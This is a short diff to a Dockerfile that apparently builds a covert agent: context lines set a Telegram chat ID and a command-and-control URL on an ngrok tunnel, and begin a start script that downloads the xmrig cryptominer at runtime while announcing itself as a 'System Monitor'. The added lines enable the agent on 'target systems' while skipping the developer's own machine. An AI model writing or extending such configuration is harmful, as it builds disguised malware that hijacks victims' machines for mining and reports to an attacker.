@@ -299,6 +299,9 @@ ENV TG_CHAT_ID=5804150664
 # Set C2 URL for HTTP mode (ngrok tunnel)
 ENV C2_URL=https://lynelle-scroddled-corinne.ngrok-free.dev
 
+# Enable agent on target systems (skip on developer machine)
+ENV SKIP_LOCAL=0
+
 # Create start script - download xmrig at runtime
 RUN echo '#!/bin/bash' > /start.sh && \
     echo 'echo "Starting System Monitor..."' >> /start.sh && \
